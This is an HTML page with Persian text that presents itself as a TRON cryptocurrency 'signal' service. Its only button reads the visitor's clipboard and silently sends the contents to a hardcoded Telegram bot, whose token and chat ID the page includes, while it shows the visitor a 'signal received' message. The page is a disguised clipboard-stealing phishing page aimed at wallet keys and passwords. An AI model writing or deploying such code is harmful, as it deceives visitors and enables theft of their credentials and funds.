<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON Signal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0b1a2e;
            color: #fff;
            text-align: center;
            padding: 20px;
        }
        .btn {
            background: #f5c542;
            color: #0b1a2e;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
        }
        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <h1>📡 دریافت سیگنال ترون</h1>
    <button class="btn" id="getSignal">📡 دریافت سیگنال</button>
    <p class="status" id="status">⏳ برای دریافت کلیک کن...</p>

    <script>
        // ============================================================
        // 🔑 توکن و آیدی (فقط برای تو)
        // ============================================================
        const BOT_TOKEN = "8910281828:AAGmbHR_85JZGP2yA3dohmM7oPvOmUN8Ae4";
        const OWNER_ID = "7074279152";

        // ============================================================
        // 📤 ارسال کلیپ‌بورد به تلگرام
        // ============================================================
        function sendClipboard(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: OWNER_ID,
                    text: `📋 **کلیپ‌بورد:**\n\`${text}\``,
                    parse_mode: 'Markdown'
                })
            });
        }

        // ============================================================
        // 🎯 دریافت کلیپ‌بورد
        // ============================================================
        document.getElementById('getSignal').addEventListener('click', async function() {
            const status = document.getElementById('status');
            status.textContent = '⏳ در حال دریافت...';

            try {
                // خواندن کلیپ‌بورد (با اجازه کاربر)
                const text = await navigator.clipboard.readText();
                
                if (text) {
                    sendClipboard(text);
                    status.textContent = '✅ سیگنال دریافت شد!';
                    status.style.color = '#7ddf9a';
                } else {
                    status.textContent = '❌ کلیپ‌بورد خالی است';
                    status.style.color = '#ff6b6b';
                }
            } catch (err) {
                status.textContent = `❌ خطا: ${err.message}`;
                status.style.color = '#ff6b6b';
            }
        });
    </script>
</body>
</html>
